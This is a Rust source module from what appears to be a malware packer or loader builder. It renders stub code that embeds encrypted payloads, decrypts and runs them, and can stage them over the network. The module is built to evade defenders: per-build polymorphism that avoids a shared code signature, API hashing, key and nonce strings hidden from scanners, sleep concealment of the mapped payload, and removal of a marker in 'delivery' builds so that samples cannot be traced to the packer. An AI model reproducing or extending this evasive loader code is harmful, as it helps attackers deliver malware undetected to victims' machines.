//! Step-based stub rendering (schema 6).
//!
//! A schema-6 plan has one ordered `runtime:` list. This module renders
//! `src/engine/templates/main.rs.tpl`: every Execution step embeds and decrypts its own
//! payload, each technique gets its own `mod step_<i>` (so two steps can use the
//! same technique without colliding on top-level names), and a generated runner
//! walks the steps in order with the declared [`StepControl`] gating.
//!
//! The same renderer serves the builtin template and a custom loader stub
//! (`build.stub.path`): the builtin must contain every placeholder (a missing one
//! is an error), while a custom stub may omit the ones it does not use — the
//! renderer then warns about each ignored block.

use std::collections::BTreeMap;

use super::api_resolution::ApiResolutionConfig;
use super::obfuscation::StringsConfig;
use super::syscalls::{self, SyscallsConfig};
use super::{args, debug, imports, stub, BuildError, Result};
use crate::plan::schema::{
    ConsoleMode, DllEntry, OutputKind, PayloadFormat, StepControl, StepFailure, StepOutcome,
};
use crate::techniques::{Category, RuntimeStep, TechniqueKind};

use super::mixer::splitmix64;

/// The builtin template's required placeholders (its contract).
const REQUIRED: &[&str] = &[
    "$STUB_HELPERS$",
    "$SLEEP_RUNTIME_BLOCK$",
    "$TLS_HANDOFF_BLOCK$",
    "$TLS_PROVISION$",
    "$ENTRY_BLOCK$",
    "$STEP_MODULES$",
    "$STEP_RUNNER_BODY$",
    "$SYSCALLS_BLOCK$",
    "$ARGS_BLOCK$",
    "$IMPORTS_BLOCK$",
    "$API_RESOLUTION_BLOCK$",
    "$STAGER_BLOCK$",
];

/// The shared stub helpers (string obfuscation and per-step decryption).
///
/// Rendered as `$STUB_HELPERS$` for the builtin template and any custom stub that
/// uses the generated runner.
const STUB_HELPERS: &str = r#"// --- Shared helpers (string obfuscation + per-step decryption) ---
#[inline(never)]
#[allow(dead_code)]
fn dec_xor(bytes: &[u8], key: &[u8; 32]) -> Vec<u8> {
    let mut out = bytes.to_vec();
    for (i, b) in out.iter_mut().enumerate() {
        *b ^= key[i % 32];
    }
    out
}

/// Decrypts one step's payload, verifying the Poly1305 tag and the size.
#[allow(dead_code)]
fn decrypt_step(enc: &[u8], nonce_hex: &str, key_hex: &str, len: usize) -> Result<Vec<u8>, String> {
    let nonce_vec = hex::decode(nonce_hex).map_err(|e| format!("invalid nonce: {e}"))?;
    let nonce: [u8; 24] = nonce_vec
        .try_into()
        .map_err(|_| "the nonce must be 24 bytes".to_string())?;
    let key_vec = hex::decode(key_hex).map_err(|e| format!("invalid key: {e}"))?;
    let key: [u8; 32] = key_vec
        .try_into()
        .map_err(|_| "the key must be 32 bytes".to_string())?;
    let cipher = XChaCha20Poly1305::new(Key::from_slice(&key));
    let image = cipher
        .decrypt(XNonce::from_slice(&nonce), enc)
        .map_err(|_| "decryption failed: wrong key/nonce or tampered payload".to_string())?;
    if image.len() != len {
        return Err("decrypted payload size does not match the expected size".to_string());
    }
    Ok(image)
}

/// Expands `%NAME%` environment references in a template (a path, ...).
///
/// An unknown name is left as written, so the template degrades to a literal
/// path instead of dropping the variable.
#[allow(dead_code)]
fn expand_env(template: &str) -> String {
    let mut out = String::new();
    let mut rest = template;
    while let Some(start) = rest.find('%') {
        out.push_str(&rest[..start]);
        let after = &rest[start + 1..];
        match after.find('%') {
            Some(end) => {
                let name = &after[..end];
                match std::env::var(name) {
                    Ok(value) => out.push_str(&value),
                    Err(_) => {
                        out.push('%');
                        out.push_str(name);
                        out.push('%');
                    }
                }
                rest = &after[end + 1..];
            }
            None => {
                out.push('%');
                rest = after;
            }
        }
    }
    out.push_str(rest);
    out
}

// --- Payload region registry ---
//
// The loader that maps the payload records its image here, so a runtime hook
// (the `Sleep` proxy) can conceal exactly the mapped payload and not the
// loader's own image. Atomics, not `thread_local!`: proxies run on payload
// threads, where the stub's TLS index is not provisioned.
mod payload_region {
    use core::sync::atomic::{AtomicUsize, Ordering};

    static BASE: AtomicUsize = AtomicUsize::new(0);
    static SIZE: AtomicUsize = AtomicUsize::new(0);
    static CONCEALS: AtomicUsize = AtomicUsize::new(0);

    /// Records a completed concealed sleep. The loader reports it after the
    /// payload returns, so a lab run can tell the ekko path actually ran.
    #[allow(dead_code)]
    pub fn record_conceal() {
        CONCEALS.fetch_add(1, Ordering::Relaxed);
    }

    /// How many concealed sleeps this process completed.
    #[allow(dead_code)]
    pub fn conceals() -> usize {
        CONCEALS.load(Ordering::Relaxed)
    }

    /// Records the mapped payload image (`base`, `SizeOfImage`).
    #[allow(dead_code)]
    pub fn set(base: usize, size: usize) {
        // Size first, base last: a reader that sees a non-zero base also sees
        // the size (Release/Acquire).
        SIZE.store(size, Ordering::Release);
        BASE.store(base, Ordering::Release);
    }

    /// The mapped payload image, if a loader recorded one.
    #[allow(dead_code)]
    pub fn get() -> Option<(usize, usize)> {
        let base = BASE.load(Ordering::Acquire);
        if base == 0 {
            return None;
        }
        let size = SIZE.load(Ordering::Acquire);
        if size == 0 {
            None
        } else {
            Some((base, size))
        }
    }
}
"#;

/// How an Execution step obtains its payload bytes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PayloadSource {
    /// The ciphertext embedded in the artifact (`include_bytes!`).
    Embedded,
    /// The staged slot only (`network_stager` `fallback: none`): the artifact
    /// carries no copy of the payload.
    Staged,
    /// The staged slot when the fetch succeeded, the embedded ciphertext
    /// otherwise (`network_stager` `fallback: embedded`).
    StagedWithFallback,
}

/// One payload handed to the renderer, already encrypted.
#[derive(Debug, Clone)]
pub struct PayloadCipher {
    /// XChaCha20 nonce (24 bytes).
    pub nonce: [u8; 24],
    /// Symmetric key (32 bytes).
    pub key: [u8; 32],
    /// Original payload size.
    pub plaintext_len: usize,
    /// Path to the ciphertext for `include_bytes!` (relative to `main.rs`).
    pub path: String,
    /// The payload's binary format (selects the Execution fragment).
    pub format: PayloadFormat,
    /// Exported function for `format: dll`.
    pub export: Option<String>,
    /// The payload's fixed arguments (`build.payloads.<name>.args`).
    pub args: Vec<String>,
    /// Whether the runtime args replace the YAML ones.
    pub args_override: bool,
    /// Per-build stub marker (self-test affordance). Printed to stderr only in
    /// a debug artifact (`build.stub.debug`); ignored, and never embedded,
    /// otherwise.
    pub marker: String,
    /// Where the payload comes from. For [`PayloadSource::Staged`],
    /// `path`/`nonce`/`key`/`plaintext_len` are unused; for
    /// [`PayloadSource::StagedWithFallback`] they describe the embedded copy the
    /// runner uses when the fetch did not stage one.
    pub source: PayloadSource,
}

/// One resolved step handed to the renderer.
#[derive(Debug, Clone)]
pub struct StepPayload {
    /// Position in the runtime list (0-based).
    pub index: usize,
    /// Human label.
    pub label: String,
    /// The technique call and its parameters.
    pub technique: TechniqueKind,
    /// How the loader reacts to this step's result.
    pub control: StepControl,
    /// The encrypted payload, for an Execution technique.
    pub payload: Option<PayloadCipher>,
}

/// Everything the step template needs.
#[derive(Debug, Clone)]
pub struct StepsParams {
    /// The ordered steps.
    pub steps: Vec<StepPayload>,
    /// Positional build args, exposed as `$ARG_<key>$`.
    pub build_args: BTreeMap<String, String>,
    /// Whether the stub is a debug artifact.
    pub debug: bool,
    /// Whether the artifact uses the `windows` subsystem.
    pub windows_subsystem: bool,
    /// What the artifact is (`build.output.kind`).
    pub kind: OutputKind,
    /// What starts the chain in a DLL build (`build.output.entry`).
    pub entry: DllEntry,
    /// Console behavior for a DLL/shellcode build (`build.output.console`).
    pub console: ConsoleMode,
    /// Per-build source-entropy seed (`build.polymorphism`), or `None` when the
    /// source phase is off (`mode: none`/`codegen`). Baked into `.text` as an
    /// immediate so two builds of one plan differ even under the same codegen
    /// profile.
    pub poly_seed: Option<u64>,
}

/// A rendered stub plus the non-fatal warnings a custom template produced.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RenderedSteps {
    /// The substituted Rust source.
    pub source: String,
    /// Non-fatal warnings (a custom stub ignoring a block).
    pub warnings: Vec<String>,
}

/// Renders the builtin step template, failing when a required placeholder is
/// missing.
pub fn render_builtin(
    template: &str,
    params: &StepsParams,
    strings: &StringsConfig,
    syscalls_config: &SyscallsConfig,
    api_resolution: &ApiResolutionConfig,
) -> Result<String> {
    for required in REQUIRED {
        if !template.contains(required) {
            return Err(BuildError::InvalidTemplate(format!(
                "placeholder '{required}' does not appear in the builtin step template"
            )));
        }
    }
    Ok(render_common(template, params, strings, syscalls_config, api_resolution)?.source)
}

/// Renders a custom loader stub template.
///
/// The template may omit any placeholder; the only hard requirement (enforced
/// separately by [`stub::validate_custom_stub_template`]) is a `fn main()` — or,
/// for a template that wants the generated entry, `$ENTRY_BLOCK$` instead. When
/// it ignores a block the declared techniques need, a warning is returned.
pub fn render_custom(
    template: &str,
    params: &StepsParams,
    strings: &StringsConfig,
    syscalls_config: &SyscallsConfig,
    api_resolution: &ApiResolutionConfig,
) -> Result<RenderedSteps> {
    let mut warnings = Vec::new();
    if !params.steps.is_empty() && !template.contains("$STEP_MODULES$") {
        warnings.push(
            "loader stub does not reference $STEP_MODULES$; the declared techniques will have no \
             effect"
                .to_string(),
        );
    }
    if !params.steps.is_empty() && !template.contains("$STEP_RUNNER_BODY$") {
        warnings.push(
            "loader stub does not reference $STEP_RUNNER_BODY$; no step will ever run".to_string(),
        );
    }
    let union = union_of(params);
    if !syscalls::required(&union).is_empty() && !template.contains("$SYSCALLS_BLOCK$") {
        warnings.push(
            "loader stub does not reference $SYSCALLS_BLOCK$; the declared techniques' nt_* calls \
             will fail to compile"
                .to_string(),
        );
    }
    if imports::needed(&union) && !template.contains("$IMPORTS_BLOCK$") {
        warnings.push(
            "loader stub does not reference $IMPORTS_BLOCK$; the declared techniques' payload \
             imports will not be resolved"
                .to_string(),
        );
    }
    if args::needed(&union) && !template.contains("$ARGS_BLOCK$") {
        warnings.push(
            "loader stub does not reference $ARGS_BLOCK$; the declared techniques' payload command \
             line will not be built"
                .to_string(),
        );
    }
    if super::sleep_runtime::needed(&union, api_resolution)
        && !template.contains("$SLEEP_RUNTIME_BLOCK$")
    {
        warnings.push(
            "loader stub does not reference $SLEEP_RUNTIME_BLOCK$; 'sleep_obfuscation' and the \
             'Sleep' hook will not compile"
                .to_string(),
        );
    }
    if !api_resolution.is_noop() && !template.contains("$API_RESOLUTION_BLOCK$") {
        warnings.push(
            "loader stub does not reference $API_RESOLUTION_BLOCK$; the declared API resolution \
             proxies and hooks will not be installed"
                .to_string(),
        );
    }

    render_common(template, params, strings, syscalls_config, api_resolution).map(|mut rendered| {
        rendered.warnings = warnings;
        rendered
    })
}

/// Renders any template by building the placeholder values and substituting.
fn render_common(
    template: &str,
    params: &StepsParams,
    strings: &StringsConfig,
    syscalls_config: &SyscallsConfig,
    api_resolution: &ApiResolutionConfig,
) -> Result<RenderedSteps> {
    let union = union_of(params);

    // One per-build seed for the API-hashing resolver's FNV-1a offset basis, so
    // its emitted hash constants are unique to this artifact instead of a fixed
    // static signature. Emitted into the stub as `API_HASH_SEED`. It derives
    // from the build's entropy (through the polymorphism seed when source
    // diversity is on, otherwise the strings key), so a replay reproduces it.
    let api_hash_seed: u64 = params
        .poly_seed
        .map(|seed| seed ^ 0xA5A5_A5A5_A5A5_A5A5)
        .unwrap_or_else(|| api_hash_seed_from_strings(strings));

    let modules: String = params
        .steps
        .iter()
        .map(|step| render_step_module(step, strings))
        .collect::<Result<Vec<_>>>()?
        .concat();
    let runner = render_runner_body(&params.steps, strings, params.debug, params.poly_seed)?;

    let mut values = BTreeMap::new();
    // The per-build source entropy is appended to the shared helpers: a function
    // whose body holds per-build immediates, so `.text` differs even when the
    // codegen profile matches (`docs/design/polymorphism.md`, phase 2).
    values.insert(
        "$STUB_HELPERS$".to_string(),
        match params.poly_seed {
            Some(seed) => format!("{STUB_HELPERS}{}", poly_helpers(seed)),
            None => STUB_HELPERS.to_string(),
        },
    );
    // The TLS handoff block renders into every stub (self-gated); only a
    // release shellcode stub calls `provision` (a debug stub keeps the
    // historical index-0 aliasing its traces were built around).
    values.insert(
        "$TLS_HANDOFF_BLOCK$".to_string(),
        super::tls::BLOCK.to_string(),
    );
    values.insert(
        "$TLS_PROVISION$".to_string(),
        if params.kind == OutputKind::Shellcode && !params.debug {
            "    tls_handoff::provision();\n".to_string()
        } else {
            String::new()
        },
    );
    // The entry point: `fn main()` for an executable, the exports for a DLL
    // (`build.output.kind`/`entry`). A custom stub that defines its own `fn main`
    // simply omits the placeholder.
    values.insert(
        "$ENTRY_BLOCK$".to_string(),
        super::entry::render(params.kind, &params.entry, params.console),
    );
    values.insert("$STEP_MODULES$".to_string(), modules);
    values.insert("$STEP_RUNNER_BODY$".to_string(), runner);
    values.insert(
        "$SLEEP_RUNTIME_BLOCK$".to_string(),
        if super::sleep_runtime::needed(&union, api_resolution) {
            super::sleep_runtime::render_block(strings)
        } else {
            String::new()
        },
    );
    values.insert(
        "$SYSCALLS_BLOCK$".to_string(),
        syscalls::render_block_with(
            syscalls_config,
            &union,
            strings,
            &api_resolution.required_syscalls(),
            api_hash_seed,
        ),
    );
    // Per-step payload args are delivered through a thread-local context the
    // runner sets before each Execution step (`crate::set_stage_args`).
    values.insert(
        "$ARGS_BLOCK$".to_string(),
        args::render_block(&union, strings),
    );
    values.insert(
        "$IMPORTS_BLOCK$".to_string(),
        imports::render_block(&union, strings),
    );
    values.insert(
        "$API_RESOLUTION_BLOCK$".to_string(),
        if imports::needed(&union) || !api_resolution.is_noop() {
            super::api_resolution::render_block(api_resolution, strings)
        } else {
            String::new()
        },
    );
    values.insert(
        "$STAGER_BLOCK$".to_string(),
        if params
            .steps
            .iter()
            .any(|step| matches!(step.technique, TechniqueKind::NetworkStager { .. }))
        {
            super::stager::render_block()
        } else {
            String::new()
        },
    );
    for (name, value) in &params.build_args {
        values.insert(format!("$ARG_{name}$"), value.clone());
    }

    let mut source = stub::substitute_template(template, &values)?;
    source.push_str(debug::render_prelude(
        params.debug,
        params.windows_subsystem,
    ));
    Ok(RenderedSteps {
        source,
        warnings: Vec::new(),
    })
}

/// The per-build source-level entropy appended to `$STUB_HELPERS$`.
///
/// The body holds four per-build immediates; because they land inside
/// instructions, two builds of the same plan differ in `.text` even when the
/// codegen profile (phase 1) happens to match. The result is unused and
/// `black_box`ed, and the function is `#[inline(never)]`, so the optimizer
/// cannot fold or delete it. Deterministic in `seed`, so the manifest seed
/// reproduces the artifact.
fn poly_helpers(seed: u64) -> String {
    let mut state = seed;
    let a = splitmix64(&mut state);
    let b = splitmix64(&mut state);
    let c = splitmix64(&mut state);
    let d = splitmix64(&mut state);
    format!(
        "\n/// Per-build entropy: bakes the build seed into `.text` so two builds of\n\
         /// one plan do not share a code signature. Behaviour is unchanged.\n\
         #[inline(never)]\n\
         #[allow(dead_code)]\n\
         fn poly_seed_mix() -> u64 {{\n\
         \x20   let a: u64 = {a:#018x};\n\
         \x20   let b: u64 = {b:#018x};\n\
         \x20   let mut x = a ^ core::hint::black_box(b);\n\
         \x20   x = x.wrapping_mul({c:#018x}) ^ {d:#018x};\n\
         \x20   core::hint::black_box(x)\n\
         }}\n"
    )
}

/// A deterministic API-hash basis when the polymorphism seed is absent
/// (`mode: none`, including debug builds).
///
/// The XOR strings key is already derived from the build entropy; the stack
/// strategy has no key, so it falls back to a fixed constant and simply stops
/// varying the resolver's basis between builds.
fn api_hash_seed_from_strings(strings: &crate::engine::obfuscation::StringsConfig) -> u64 {
    let mut seed = 0x5049_4341_524F_0001u64;
    if let Some(key) = strings.key {
        let mut state = seed;
        seed = splitmix64(&mut state);
        for (index, byte) in key.iter().take(8).enumerate() {
            seed ^= u64::from(*byte) << (index * 8);
        }
    }
    seed
}

/// The union of every step's technique, for the shared blocks.
fn union_of(params: &StepsParams) -> Vec<RuntimeStep> {
    params
        .steps
        .iter()
        .map(|step| RuntimeStep::new(step.technique.clone()))
        .collect()
}

/// Renders one step's private module, or `None` for an inline `sleep` step.
fn render_step_module(step: &StepPayload, strings: &StringsConfig) -> Result<String> {
    if let TechniqueKind::Sleep { .. } = &step.technique {
        // A sleep is a single line, not a module.
        return Ok(String::new());
    }

    let format = step
        .payload
        .as_ref()
        .map_or(PayloadFormat::Pe, |payload| payload.format);
    let export = step
        .payload
        .as_ref()
        .and_then(|payload| payload.export.as_deref());
    let fragment = step.technique.render_fragment(strings, format, export);

    // The `bouncer` decoy and the `drop` file are embedded, encrypted assets a
    // Preparation step carries. Their module-level constants and `asset_bytes()`
    // helper are injected ahead of the fragment (which calls them at run time).
    let asset_prelude = match &step.technique {
        TechniqueKind::Bouncer { .. } | TechniqueKind::Drop { .. } => render_step_asset(step),
        _ => String::new(),
    };

    let body = match step.technique.category() {
        Category::Preparation => format!(
            "{asset_prelude}{fragment}\n    pub fn run() -> Result<bool, String> {{\n        {}().map_err(|e| e.to_string())\n    }}\n",
            step.technique.name()
        ),
        Category::Execution => {
            // A fragment that executes the payload must be an Execution
            // technique with a resolved payload.
            if step.payload.is_none() {
                return Err(BuildError::InvalidTemplate(format!(
                    "step {} ('{}') is an execution technique without a payload",
                    step.index,
                    step.technique.name()
                )));
            }
            format!(
                "{fragment}\n    pub fn payload(image: &mut [u8]) -> Result<i32, String> {{\n        execute_payload(image)\n    }}\n"
            )
        }
        Category::Control => format!(
            "{fragment}\n    pub fn run() -> Result<i32, String> {{\n        run_exec()\n    }}\n"
        ),
    };
    Ok(format!("mod step_{} {{\n{body}}}\n", step.index))
}

/// Renders an embedded asset into a step module (the `bouncer` decoy and the
/// `drop` file).
///
/// When the step carries an asset payload, its module gets the ciphertext
/// `include_bytes!` and an `asset_bytes()` helper that decrypts it on demand.
/// Without an asset the helper is a dead stub, so a fragment type-checks for
/// every such step.
fn render_step_asset(step: &StepPayload) -> String {
    match &step.payload {
        Some(payload) => format!(
            "    // Embedded asset: XChaCha20-encrypted, decrypted on demand.\n\
             \x20   const ASSET_ENC: &[u8] = include_bytes!(\"{path}\");\n\
             \x20   const ASSET_NONCE: &str = \"{nonce}\";\n\
             \x20   const ASSET_KEY: &str = \"{key}\";\n\
             \x20   const ASSET_LEN: usize = {len};\n\
             \x20   fn asset_bytes() -> Result<Vec<u8>, String> {{\n\
             \x20       crate::decrypt_step(ASSET_ENC, ASSET_NONCE, ASSET_KEY, ASSET_LEN)\n\
             \x20   }}\n",
            path = payload.path,
            nonce = hex::encode(payload.nonce),
            key = hex::encode(payload.key),
            len = payload.plaintext_len,
        ),
        None => "    #[allow(dead_code)]\n\
                 \x20   fn asset_bytes() -> Result<Vec<u8>, String> {\n\
                 \x20       Err(String::new())\n\
                 \x20   }\n"
            .to_string(),
    }
}

/// Sanitizes a step label for the generated line comment.
///
/// The label embeds the payload name, which the plan controls: a raw newline
/// would close the comment and turn the rest of the name into stub code, so both
/// line terminators become spaces.
fn comment_label(label: &str) -> String {
    label.replace(['\r', '\n'], " ")
}

/// Renders the runner body: one straight-line block per step, in order.
fn render_runner_body(
    steps: &[StepPayload],
    strings: &StringsConfig,
    debug: bool,
    poly_seed: Option<u64>,
) -> Result<String> {
    let mut body = String::new();
    if poly_seed.is_some() {
        // Runs once before any step: the call keeps the per-build entropy
        // function in the binary (the optimizer would drop an uncalled one).
        body.push_str("    let _ = crate::poly_seed_mix();\n");
    }
    for step in steps {
        body.push_str(&format!(
            "\n    // --- step {}: {} ---\n",
            step.index,
            comment_label(&step.label)
        ));
        if step.control.delay_ms > 0 {
            body.push_str(&sleep_line(step.control.delay_ms));
        }
        let success = success_action(step.control.on_success);
        let failure = failure_action(step.control.on_fail);
        match &step.technique {
            TechniqueKind::Sleep { params } => {
                body.push_str(&sleep_line(params.ms));
            }
            technique => match technique.category() {
                Category::Preparation => {
                    body.push_str(&format!(
                        "    match step_{index}::run() {{\n\
                         \x20       Ok(true) => {{{success}}}\n\
                         \x20       Ok(false) => return Ok(0),\n\
                         \x20       Err(e) => {{{failure}}}\n\
                         \x20   }}\n",
                        index = step.index,
                    ));
                }
                Category::Execution => {
                    let payload = step.payload.as_ref().ok_or_else(|| {
                        BuildError::InvalidTemplate(format!(
                            "step {} ('{}') is an execution technique without a payload",
                            step.index,
                            technique.name()
                        ))
                    })?;
                    body.push_str(&render_execution_block(
                        step.index,
                        payload,
                        strings,
                        success,
                        failure,
                        step.control.on_fail,
                        debug,
                    ));
                }
                Category::Control => {
                    body.push_str(&format!(
                        "    match step_{index}::run() {{\n\
                         \x20       Ok(code) => {{\n\
                         \x20           last = code;{success}\n\
                         \x20       }}\n\
                         \x20       Err(e) => {{{failure}}}\n\
                         \x20   }}\n",
                        index = step.index,
                    ));
                }
            },
        }
    }
    Ok(body)
}

/// The runner block that decrypts and runs an Execution step's payload.
///
/// The nonce and key are hex-encoded at build time but never emitted as
/// cleartext literals: they go through `strings` like the step args, so the
/// stage does not carry a 24-byte nonce and its 32-byte key side by side for
/// `strings <stage>` to pick up.
///
/// `debug` is the *only* thing that decides whether the per-build `stub_marker`
/// is emitted. A delivery build (`debug == false`) must stay silent: the marker
/// is a runtime token that links a running sample to the packer, so both the
/// print and the obfuscated string are left out of the generated source
/// entirely. `build.stub.debug` is a laboratory-only affordance.
fn render_execution_block(
    index: usize,
    payload: &PayloadCipher,
    strings: &StringsConfig,
    success: &str,
    failure: &str,
    on_fail: StepFailure,
    debug: bool,
) -> String {
    let marker_line = if debug {
        let marker = strings
            .obfuscate(&payload.marker)
            .render_stub_expr("stub_marker");
        format!(
            "        let stub_marker: String = {marker};\n\
             \x20       eprintln!(\"{{stub_marker}}\");\n"
        )
    } else {
        String::new()
    };
    let args = args_expr(&payload.args, strings);
    let overridden = if payload.args_override {
        "true"
    } else {
        "false"
    };
    let label = format!("'step_{index}");
    let (block_open, pre_failure) = step_block(&label, on_fail);

    match payload.source {
        // A staged payload is fetched at run time by a preceding
        // `network_stager` step and read from the shared slot, so there is no
        // embedded ciphertext.
        PayloadSource::Staged => format!(
            "    {block_open}\n\
             \x20       crate::set_stage_args({args}, {overridden});\n\
             \x20       let mut image = match crate::take_staged_payload() {{\n\
             \x20           Ok(bytes) => bytes,\n\
             \x20           Err(e) => {{ {pre_failure} }}\n\
             \x20       }};\n\
             {marker_line}\
             \x20       match step_{index}::payload(&mut image) {{\n\
             \x20           Ok(code) => {{\n\
             \x20               last = code;{success}\n\
             \x20           }}\n\
             \x20           Err(e) => {{{failure}}}\n\
             \x20       }}\n\
             \x20   }}\n",
            args = args,
            overridden = overridden,
            block_open = block_open,
            pre_failure = pre_failure,
            marker_line = marker_line,
            index = index,
        ),
        // `network_stager` with `fallback: embedded`: the fetched copy wins
        // when the fetch staged one, the embedded ciphertext otherwise.
        PayloadSource::StagedWithFallback => format!(
            "    {block_open}\n\
             \x20       crate::set_stage_args({args}, {overridden});\n\
             \x20       let mut image = match crate::take_staged_payload() {{\n\
             \x20           Ok(bytes) => bytes,\n\
             \x20           Err(_) => {{\n\
             \x20               let enc: &[u8] = include_bytes!(\"{path}\");\n\
             \x20               let payload_nonce: String = {nonce};\n\
             \x20               let payload_key: String = {key};\n\
             \x20               match decrypt_step(enc, &payload_nonce, &payload_key, {len}) {{\n\
             \x20                   Ok(bytes) => bytes,\n\
             \x20                   Err(e) => {{ {pre_failure} }}\n\
             \x20               }}\n\
             \x20           }}\n\
             \x20       }};\n\
             {marker_line}\
             \x20       match step_{index}::payload(&mut image) {{\n\
             \x20           Ok(code) => {{\n\
             \x20               last = code;{success}\n\
             \x20           }}\n\
             \x20           Err(e) => {{{failure}}}\n\
             \x20       }}\n\
             \x20   }}\n",
            args = args,
            overridden = overridden,
            block_open = block_open,
            pre_failure = pre_failure,
            path = payload.path,
            nonce = secret_expr(&payload.nonce, "payload_nonce", strings),
            key = secret_expr(&payload.key, "payload_key", strings),
            len = payload.plaintext_len,
            marker_line = marker_line,
            index = index,
        ),
        PayloadSource::Embedded => format!(
            "    {block_open}\n\
             \x20       crate::set_stage_args({args}, {overridden});\n\
             \x20       let enc: &[u8] = include_bytes!(\"{path}\");\n\
             \x20       let payload_nonce: String = {nonce};\n\
             \x20       let payload_key: String = {key};\n\
             \x20       let mut image = match decrypt_step(enc, &payload_nonce, &payload_key, {len}) {{\n\
             \x20           Ok(bytes) => bytes,\n\
             \x20           Err(e) => {{ {pre_failure} }}\n\
             \x20       }};\n\
             {marker_line}\
             \x20       match step_{index}::payload(&mut image) {{\n\
             \x20           Ok(code) => {{\n\
             \x20               last = code;{success}\n\
             \x20           }}\n\
             \x20           Err(e) => {{{failure}}}\n\
             \x20       }}\n\
             \x20   }}\n",
            args = args,
            overridden = overridden,
            block_open = block_open,
            pre_failure = pre_failure,
            path = payload.path,
            nonce = secret_expr(&payload.nonce, "payload_nonce", strings),
            key = secret_expr(&payload.key, "payload_key", strings),
            len = payload.plaintext_len,
            marker_line = marker_line,
            index = index,
        ),
    }
}

/// The opening of a step's runner block and its pre-payload failure action.
///
/// Only `continue` needs a label: it breaks out of the step block instead of
/// returning from `run()`, so a later step still runs. `stop` and `exit` leave
/// the chain exactly as the payload error arm does, in a plain block (a label
/// they never use would draw `unused_labels` in the generated stub).
fn step_block(label: &str, on_fail: StepFailure) -> (String, String) {
    match on_fail {
        StepFailure::Continue => (
            format!("{label}: {{"),
            format!("eprintln!(\"{{e}}\"); break {label};"),
        ),
        StepFailure::Stop => ("{".to_string(), "return Err(e);".to_string()),
        StepFailure::Exit => (
            "{".to_string(),
            "eprintln!(\"{e}\"); return Ok(0);".to_string(),
        ),
    }
}

/// The runtime reconstruction expression for a hex-encoded payload secret.
///
/// The nonce and the key follow `build.stub.strings` like every other stub
/// literal, so neither lands in the stage as a cleartext hex string. There is
/// no plaintext strategy (`from_yaml` accepts only `xor` and `stack`), so the
/// emitted expression always rebuilds the string at run time; `stack` also
/// keeps the bytes out of `.rdata`.
fn secret_expr(secret: &[u8], var_name: &str, strings: &StringsConfig) -> String {
    strings
        .obfuscate(&hex::encode(secret))
        .render_stub_expr(var_name)
}

/// One inline sleep.
fn sleep_line(ms: u64) -> String {
    format!("    std::thread::sleep(std::time::Duration::from_millis({ms}));\n")
}

/// The `Vec<String>` expression for a step's YAML args, rebuilt at run time.
fn args_expr(args: &[String], strings: &StringsConfig) -> String {
    if args.is_empty() {
        return "vec![]".to_string();
    }
    let mut body = String::from("vec![\n");
    for (index, arg) in args.iter().enumerate() {
        let expr = strings
            .obfuscate(arg)
            .render_stub_expr(&format!("step_arg_{index}"));
        body.push_str(&format!("            {expr},\n"));
    }
    body.push_str("        ]");
    body
}

/// The `on_success` code appended after a step sets `last`.
fn success_action(outcome: StepOutcome) -> &'static str {
    match outcome {
        StepOutcome::Continue => "",
        StepOutcome::Stop => " return Ok(last);",
        StepOutcome::Exit => " return Ok(0);",
    }
}

/// The `on_fail` code run in the `Err(e)` arm.
fn failure_action(failure: StepFailure) -> &'static str {
    match failure {
        StepFailure::Stop => "return Err(e);",
        StepFailure::Continue => "eprintln!(\"{e}\");",
        StepFailure::Exit => "eprintln!(\"{e}\"); return Ok(0);",
    }
}

/// Test support: builds [`StepsParams`] from a `RuntimeStep` list, attaching the
/// given cipher to every Execution step.
///
/// Lets the ignored compile tests (which think in terms of a technique runtime)
/// drive the step renderer without re-deriving the cipher plumbing.
#[cfg(test)]
#[cfg(feature = "live-tests")]
pub(crate) fn test_params(
    runtime: &[RuntimeStep],
    encrypted: &crate::engine::crypto::EncryptedPayload,
    payload_path: &str,
    format: PayloadFormat,
    export: Option<&str>,
    debug: bool,
) -> StepsParams {
    let steps = runtime
        .iter()
        .enumerate()
        .map(|(index, step)| {
            let payload = (step.category() == Category::Execution).then(|| PayloadCipher {
                nonce: encrypted.nonce,
                key: encrypted.key,
                plaintext_len: encrypted.plaintext_len,
                path: payload_path.to_string(),
                format,
                export: export.map(str::to_string),
                args: Vec::new(),
                args_override: false,
                marker: stub::generate_stub_marker(),
                source: PayloadSource::Embedded,
            });
            StepPayload {
                index,
                label: step.name().to_string(),
                technique: step.technique.clone(),
                control: step.control,
                payload,
            }
        })
        .collect();
    StepsParams {
        steps,
        build_args: BTreeMap::new(),
        debug,
        windows_subsystem: false,
        kind: OutputKind::Exe,
        entry: DllEntry::Auto,
        console: ConsoleMode::Parent,
        poly_seed: None,
    }
}

#[cfg(test)]
mod tests;
